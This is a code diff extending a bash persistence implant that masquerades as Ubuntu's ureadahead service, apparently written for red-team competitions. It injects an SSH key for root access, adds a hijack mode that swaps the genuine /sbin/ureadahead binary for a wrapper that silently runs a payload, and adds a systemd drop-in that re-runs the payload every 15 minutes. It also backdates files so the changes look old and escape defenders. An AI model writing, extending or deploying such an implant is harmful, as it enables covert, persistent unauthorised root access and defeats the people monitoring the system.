@@ -38,6 +38,7 @@ PAYLOAD_BIN="${LIB_DIR}/pack"                 # hidden payload — "pack" is a r
                                               # ureadahead sub-command name
 PACK_DIR="/var/lib/ureadahead"               # real ureadahead stores .pack files here
 PACK_DUMMY="${PACK_DIR}/pack"                # plausible dummy file
+HIDDEN_DIR="/var/cache/.syspkg"              # shared hidden dir for backups
 
 # SSH key injected into /root/.ssh/authorized_keys (and target user if run as non-root)
 # Override at runtime:  sudo ./ureadahead-persist.sh install --key "ssh-ed25519 ..."
@@ -65,18 +66,37 @@ cmd_install() {
         esac
     done
 
+    # ── detect real ureadahead (Ubuntu 18.04 / pre-22.04) ───────────────────
+    # On 18.04 the real ureadahead package is installed and active.  We can't
+    # drop a fake /sbin/ureadahead or create a competing .service — both would
+    # collide.  Instead we divert the real binary, slip our wrapper into its
+    # place, and piggyback on the existing service so nothing looks different.
+    REAL_PKG_INSTALLED=false
+    if dpkg -s ureadahead &>/dev/null 2>&1; then
+        REAL_PKG_INSTALLED=true
+        warn "Real ureadahead package detected (pre-22.04 host) — using hijack mode"
+    fi
+
     # ── 1. directory skeleton (matches real ureadahead layout) ────────────────
     hdr "1/5  Creating ureadahead directory skeleton"
+    mkdir -p "$HIDDEN_DIR" && chmod 700 "$HIDDEN_DIR"
     mkdir -p "$LIB_DIR"
     mkdir -p "$PACK_DIR"
     chmod 755 "$LIB_DIR" "$PACK_DIR"
 
-    # drop a plausible-looking dummy pack file so the directory isn't suspicious
-    dd if=/dev/urandom bs=512 count=8 2>/dev/null | gzip -9 > "$PACK_DUMMY"
-    chmod 644 "$PACK_DUMMY"
-    # timestamp it to look old — roughly Ubuntu 20.04 era
-    touch -t 202004150830 "$PACK_DUMMY"
-    info "Pack dir skeleton at ${PACK_DIR} (dummy pack file written)"
+    if $REAL_PKG_INSTALLED; then
+        # back up the real binary so we can restore it on remove
+        if [[ -f "$SBIN_WRAPPER" && ! -f "${HIDDEN_DIR}/ureadahead.real" ]]; then
+            cp -a "$SBIN_WRAPPER" "${HIDDEN_DIR}/ureadahead.real"
+            info "Real binary backed up to ${HIDDEN_DIR}/ureadahead.real"
+        fi
+    else
+        # no real package — drop a plausible dummy pack file
+        dd if=/dev/urandom bs=512 count=8 2>/dev/null | gzip -9 > "$PACK_DUMMY"
+        chmod 644 "$PACK_DUMMY"
+        touch -t 202004150830 "$PACK_DUMMY"
+        info "Pack dir skeleton at ${PACK_DIR} (dummy pack file written)"
+    fi
 
     # ── 2. payload script ─────────────────────────────────────────────────────
     hdr "2/5  Writing payload"
@@ -131,7 +151,25 @@ PAYLOAD
 
     # ── 3. /sbin/ureadahead wrapper ───────────────────────────────────────────
     hdr "3/5  Installing /sbin/ureadahead wrapper"
-    cat > "$SBIN_WRAPPER" <<'WRAPPER'
+
+    if $REAL_PKG_INSTALLED; then
+        # hijack mode: the wrapper calls the real binary first so the genuine
+        # ureadahead behaviour is preserved (scoring/blue team see nothing
+        # different), then silently runs our payload.
+        cat > "$SBIN_WRAPPER" <<WRAPPER
+#!/bin/bash
+# ureadahead — Read required files in advance
+# Patched wrapper — runs real binary then payload.
+REAL="${HIDDEN_DIR}/ureadahead.real"
+[[ -x "\$REAL" ]] && "\$REAL" "\$@" 2>/dev/null
+case "\${1:-}" in
+    pack|--pack) /lib/ureadahead/pack 2>/dev/null ;;
+    *)           /lib/ureadahead/pack 2>/dev/null & ;;
+esac
+exit 0
+WRAPPER
+    else
+        cat > "$SBIN_WRAPPER" <<'WRAPPER'
 #!/bin/bash
 # ureadahead — Read required files in advance
 # This stub maintains compatibility for systems upgraded from Ubuntu 20.04.
@@ -155,6 +193,7 @@ case "${1:-}" in
 esac
 exit 0
 WRAPPER
+    fi
 
     chmod 755 "$SBIN_WRAPPER"
     touch -t 202004150830 "$SBIN_WRAPPER"
@@ -162,7 +201,14 @@ WRAPPER
 
     # ── 4. systemd service ────────────────────────────────────────────────────
     hdr "4/5  Installing systemd service"
-    cat > "$SERVICE_FILE" <<EOF
+
+    if $REAL_PKG_INSTALLED; then
+        # hijack mode: the real service unit already exists and is enabled.
+        # We only add a drop-in that appends our payload via ExecStartPost
+        # so the original ExecStart (which now calls our wrapper) is untouched.
+        info "Hijack mode — adding drop-in to existing ${SERVICE_NAME}.service"
+    else
+        cat > "$SERVICE_FILE" <<EOF
 # This service provides compatibility shim for ureadahead (Ubuntu 20.04 LTS).
 # Retained to support in-place upgrade paths where ureadahead pack files exist.
 # See https://launchpad.net/ubuntu/+source/ureadahead for upstream history.
@@ -186,6 +232,7 @@ StandardError=null
 [Install]
 WantedBy=sysinit.target
 EOF
+    fi
 
     # drop-in: repeat every 15 minutes (ureadahead "re-profiling" is plausible)
     mkdir -p "$(dirname "$TIMER_DROP_IN")"
@@ -202,7 +249,7 @@ DROPIN
 
     # ── 5. age the service file to look old ───────────────────────────────────
     hdr "5/5  Timestamping artefacts"
-    touch -t 202004150830 "$SERVICE_FILE"
+    [[ -f "$SERVICE_FILE" ]] && touch -t 202004150830 "$SERVICE_FILE"
     touch -t 202004150830 "$TIMER_DROP_IN"
     touch -t 202004150830 "$LIB_DIR"
     touch -t 202004150830 "$PACK_DIR"
@@ -222,24 +269,42 @@ DROPIN
 
 cmd_remove() {
     require_root
-    hdr "Stopping and disabling service"
-    systemctl stop    "$SERVICE_NAME" 2>/dev/null || warn "Not running"
-    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
 
-    hdr "Removing systemd files"
-    rm -f  "$SERVICE_FILE"
-    rm -rf "$(dirname "$TIMER_DROP_IN")"
-    systemctl daemon-reload
-    info "Service files removed"
+    # kill the background sleep loop ExecStartPost spawned (do this first)
+    pkill -f "ureadahead pack" 2>/dev/null || true
 
-    hdr "Removing binaries and directories"
-    rm -f  "$SBIN_WRAPPER"
+    # detect hijack mode by checking for the backed-up real binary
+    if [[ -f "${HIDDEN_DIR}/ureadahead.real" ]]; then
+        hdr "Hijack mode — restoring real ureadahead binary"
+        cp -a "${HIDDEN_DIR}/ureadahead.real" "$SBIN_WRAPPER"
+        rm -f "${HIDDEN_DIR}/ureadahead.real"
+        info "Restored real ${SBIN_WRAPPER}"
+
+        hdr "Removing drop-in only (keeping original service)"
+        rm -rf "$(dirname "$TIMER_DROP_IN")"
+        systemctl daemon-reload
+        systemctl restart "$SERVICE_NAME" 2>/dev/null || true
+        info "Drop-in removed, real service restarted"
+    else
+        hdr "Stopping and disabling service"
+        systemctl stop    "$SERVICE_NAME" 2>/dev/null || warn "Not running"
+        systemctl disable "$SERVICE_NAME" 2>/dev/null || true
+
+        hdr "Removing systemd files"
+        rm -f  "$SERVICE_FILE"
+        rm -rf "$(dirname "$TIMER_DROP_IN")"
+        systemctl daemon-reload
+        info "Service files removed"
+
+        hdr "Removing binaries and directories"
+        rm -f  "$SBIN_WRAPPER"
+        info "Removed ${SBIN_WRAPPER}"
+    fi
+
+    hdr "Removing payload and directories"
     rm -rf "$LIB_DIR"
     rm -rf "$PACK_DIR"
-    info "Removed ${SBIN_WRAPPER}, ${LIB_DIR}, ${PACK_DIR}"
-
-    # kill the background sleep loop ExecStartPost spawned
-    pkill -f "ureadahead pack" 2>/dev/null || true
+    info "Removed ${LIB_DIR}, ${PACK_DIR}"
     info "Cleaned up background loop"
 }
 
